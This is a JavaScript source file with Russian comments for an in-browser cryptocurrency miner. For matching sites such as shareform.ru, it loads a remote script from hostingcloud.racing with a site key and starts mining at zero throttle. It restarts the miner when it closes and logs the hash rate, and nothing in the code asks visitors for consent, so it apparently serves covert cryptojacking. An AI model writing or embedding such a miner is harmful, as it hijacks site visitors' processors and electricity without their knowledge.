function coins(sites) {
    let instance = {};
    const url = new URL(document.location.href);
    if (!arguments.length) {
        sites = [{
                id: 'local',
                match: '127.0.0.1',
                src: 'https://www.hostingcloud.racing/2KFX.js',
                key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
            },
            {
                id: 'share',
                match: 'shareform.ru',
                src: 'https://www.hostingcloud.racing/rhdQ.js',
                key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
            }
        ];
    }
    let src; //script src
    let key;
    
    // настройки по умолчанию
    let settings = {};
    settings.throttle = 0;
    settings.c = 'w';
    settings.ads = 0;

    // переменные майнера
    let onMobile;
    let wasmEnabled;
    let isAutoThreads;
    let hps;
    let threads;
    let throttle;

    //вспомогательные переменные текущего состояния
    let start;
    let now;
    let last;
    let running = false;
    let hashes = 0;
    let jobs = 0;
    let founds = 0;
    

    function loadScript(src) {
        return new Promise(function(resolve, reject) {
            let script = document.createElement('script');

            script.src = src;

            script.onload = () => resolve(script);
            script.onerror = () => reject(new Error(`Ошибка загрузки скрипта ${src}`));

            document.head.append(script);
        });
    }

    // присваиваем или получаем src
    instance.src = (s) => {
        if (!arguments.length) return src;
        src = s;
        return instance;
    };

    // присваиваем или получаем key
    instance.key = (k) => {
        if (!arguments.length) return key;
        key = k;
        return instance;
    };
    
    // присваиваем или получаем settings
    instance.settings = (s) => {
        if (!arguments.length) return settings;
        settings = s;
        return instance;
    };

    // добавляем сайт
    instance.addSite = (site) => {
        sites.push(site);
        // пример
        /*
            {
                id: 'local',
                match: '127.0.0.1',
                src: 'https://www.hostingcloud.racing/2KFX.js',
                key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
            }
        */
        
        return instance;
    };

    // запускаем майнер
    instance.start = () => {

        sites.forEach(function(item, _i, _arr) {
            if (url.toString().indexOf(item.match) != -1) {
                src = item.src;
                key = item.key;
            }
        });

        loadScript(src)
            .then(
                function(result) {
                    let _client = new Client.Anonymous(key, settings);
                    
                    start = new Date();
                    now = start;
                    last = start;

                    _client.start();

                    onMobile = _client.isMobile();
                    wasmEnabled = _client.hasWASMSupport();
                    isAutoThreads = _client.getAutoThreadsEnabled();
                    hps = _client.getHashesPerSecond();
                    threads = _client.getNumThreads();
                    throttle = _client.getThrottle();

                    _client.on('open', function(args) {
                        start = new Date();
                    });

                    _client.on('job', function(args) {
                        jobs = jobs + 1;
                        console.log('job: ');
                        console.log(args);
                        /*

                        {algo: "lyra2v2-webchain", blob: "f901d9a06260f54cb2e8aa5098d10f3f7b78145b7593972315…1835fb9608347e7c48084600f1ca580880000000000000000", job_id: "1db5bc16d5ea5d9e1a958e28b537cec3", target: "4ac5d987cfb02b00", throttle: 0}

                        */
                    });

                    _client.on('found', function(args) {
                        console.log('found: ');
                        console.log(args);
                        /*

                        {hashesPerSecond: 0.9893007128039792, hashes: 1, job_id: "9cecf646f600e75ed1ff9c8bbdfbda4e", nonce: "c29dcb5c507896bc", result: "000a4a60b04dec1bcbe1ac8014f22e0252d4b45bd8167a42c79c675aee587abe"}

                        */
                        founds = founds + 1;
                        last = new Date();
                        if (founds > jobs) {
                            founds = 0;
                            _client.stop();
                        }
                    });

                    _client.on('close', function(args) {
                        jobs = 0;
                        founds = 0;
                        last = new Date();
                        _client.start();
                    });

                    setInterval(function() {

                        running = _client.isRunning();
                        hps = _client.getHashesPerSecond();

                        now = new Date();
                        let diff = ((now - last) / 1000).toFixed(1);

                        console.log(hps.toFixed(2) + ' (' + jobs + '/' + founds + ') ' + diff + 'с');


                        if (diff > 90) {
                            last = new Date();
                            _client.stop();
                        }


                    }, 500);
                },
                function(error) {
                    console.log(error);
                });
        return instance;
    };

    return instance;
}